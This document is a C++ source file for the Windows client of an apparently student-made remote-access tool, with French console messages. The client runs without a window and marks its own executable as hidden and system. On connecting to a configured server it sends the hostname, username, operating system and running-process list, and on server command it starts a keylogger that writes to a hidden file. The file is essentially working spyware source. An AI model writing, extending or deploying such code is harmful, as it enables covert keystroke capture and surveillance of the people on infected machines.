#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF_Socket.hpp"
#include "../utils/PacketType.hpp"
#include "../utils/LPTF_Packet.hpp"
#include "../utils/SystemInfo.hpp"
#include "../utils/TaskList.hpp"
#include "../utils/NetworkInfoFactory.hpp"
#include "../utils/KeyLogger.hpp"
#include <iostream>
#include <windows.h>
#include <thread>
#include <atomic>
#include <iomanip> 
#include <sstream>

using namespace std;

// Global variables for thread communication
atomic<bool> running(true);
LPTF_Socket* globalSocket = nullptr;
static KeyLogger* globalLogger = nullptr;
static std::thread keylogThread;


// Thread function to handle server requests
void serverRequestHandler() {
    while (running) {
        try {
            vector<uint8_t> data = globalSocket->recvBinary();
            LPTF_Packet packet = LPTF_Packet::deserialize(data);
            
            switch (packet.getType()) {
                case PacketType::GET_INFO: {
                    cout << "\n[SERVEUR] Demande des informations système..." << endl;
                    
                    // Collect system information
                    auto sysInfo = SystemInfo::getSystemInfo();
                    string jsonInfo = SystemInfo::toJson(sysInfo);
                    
                    cout << "[SERVEUR] Informations collectées et envoyées." << endl;
                    
                    // Send response
                    vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
                    LPTF_Packet response(1, PacketType::RESPONSE, 0, 1, 1, payload);
                    
                    globalSocket->sendBinary(response.serialize());
                    cout << "Entrez le message : ";
                    cout.flush();
                    break;
                }
                
                case PacketType::RESPONSE: {
                    string response(packet.getPayload().begin(), packet.getPayload().end());
                    cout << "\nRéponse serveur : " << response << endl;
                    cout << "Entrez le message : ";
                    cout.flush();
                    break;
                }
                
                case PacketType::KEYLOG: {
                    // Start or stop keylogger based on payload
                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                    if (cmd == "start") {
                        if (!globalLogger) {
                            globalLogger = new KeyLogger("key_file.txt");
                            KeyLogger::hideFile("key_file.txt");
                            keylogThread = std::thread([]() {
                                globalLogger->start();
                            });
                            keylogThread.detach();
                            }
                        }
                        else if (cmd == "stop") {
                            if (globalLogger) {
                                globalLogger->stop();
                                KeyLogger::unhideFile("key_file.txt");
                                delete globalLogger;
                                globalLogger = nullptr;
                            }
                        }

                    break;
                }
                
                default:
                    cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << endl;
                    cout << "Entrez le message : ";
                    cout.flush();
            }
            
        } catch (const exception& e) {
            if (running) {
                cout << "\n[ERREUR] Connexion fermée: " << e.what() << endl;
                running = false;
            }
            break;
        }
    }
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    // test des fonction getipaddresses getmacaddresses de collecte d'informations réseau
    //! to delete later
     auto network = NetworkInfoFactory::create();

    std::cout << "IP Addresses:\n";
    for (const auto& ip : network->getIPAddresses()) {
        std::cout << "  " << ip << "\n";
    }
    std::cout << "MAC Addresses:\n";
    for (const auto& mac : network->getMACAddresses()) {
        std::cout << "  " << mac << "\n";
    }

    // Active IP and MAC addresses
    std::cout << "Active IP Addresses:\n";
    for (const auto& ip : network->getActiveIPAddresses()) {
        std::cout << "  " << ip << "\n";
    }
    std::cout << "Active MAC Addresses:\n";
    for (const auto& mac : network->getActiveMACAddresses()) {
        std::cout << "  " << mac << "\n";
    }
    // fin de test des fonction de collecte d'informations réseau
    // Hide the current executable
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    KeyLogger::hideFile("key_file.txt");

    try {
        LPTF_Socket::initialize();
        LPTF_Socket clientSocket;
        globalSocket = &clientSocket;
        
        auto env = EnvLoader::loadEnv("../../.env");
        string ip = EnvLoader::loadIP("../../.env");
        int port = EnvLoader::loadPort("../../.env");

        clientSocket.connectSocket(ip, port);
        cout << "Connecté au serveur " << ip << ":" << port << endl;
        
        // AUTO-SEND SYSTEM INFO ON CONNECTION
        cout << "Envoi automatique des informations système..." << endl;
        auto sysInfo = SystemInfo::getSystemInfo();
        string jsonInfo = SystemInfo::toJson(sysInfo);
        
        cout << "Informations système:" << endl;
        cout << "- Nom d'hôte: " << sysInfo["hostname"] << endl;
        cout << "- Utilisateur: " << sysInfo["username"] << endl;
        cout << "- Système: " << sysInfo["operating_system"] << endl;
        
        // Send system info as GET_INFO packet (since that's what server expects)
        vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
        LPTF_Packet sysInfoPacket(1, PacketType::GET_INFO, 0, 1, 1, payload);
        clientSocket.sendBinary(sysInfoPacket.serialize());
        
        cout << "Informations système envoyées au serveur." << endl;
        
        // KEYLOGGER 
        // std::thread([]() {
        //     KeyLogger logger("key_file.txt");
        //     logger.start();
        // }).detach();
        // ========================
        ProcessLister processLister;
        // cout << "\nListe des processus en cours d'exécution :" << endl;
        // if (!processLister.listProcesses()) {
        //     cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
        // }

        vector<string> exeList = processLister.getExeList();

        // cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
        // const int columns = 3;
        // int count = 0;
        // for (const auto& exe : exeList) {
        //     cout << std::left << std::setw(25) << exe; 
        //     count++;
        //     if (count % columns == 0)
        //         cout << endl;
        // }
        // if (count % columns != 0)
        //     cout << endl;

        cout << "(Tapez 'sortie' pour quitter)" << endl;
        
        // Send process list to server
        std::ostringstream oss;
        for (const auto& exe : exeList) {
            oss << exe << '\n';
        }
        std::string procData = oss.str();
        std::vector<uint8_t> procPayload(procData.begin(), procData.end());
        LPTF_Packet procPacket(1, PacketType::PROCESS_LIST, 0, 1, 1, procPayload);
        clientSocket.sendBinary(procPacket.serialize());

        thread serverThread(serverRequestHandler);

        // Main thread for user interaction
        while (running) {
            string msg;
            cout << "Entrez le message : ";
            getline(cin, msg);

            if (msg == "sortie") {
                running = false;
                break;
            }

            // Send regular messages
            vector<uint8_t> msgPayload(msg.begin(), msg.end());
            LPTF_Packet packet(1, PacketType::GET_INFO, 0, 1, 1, msgPayload);
            clientSocket.sendBinary(packet.serialize());
        }

        // Clean shutdown
        running = false;
        if (serverThread.joinable()) {
            serverThread.join();
        }
        clientSocket.closeSocket();

    } catch (const exception& e) {
        cerr << "Exception Client: " << e.what() << endl;
        running = false;
        return 1;
    }
    return 0;
}
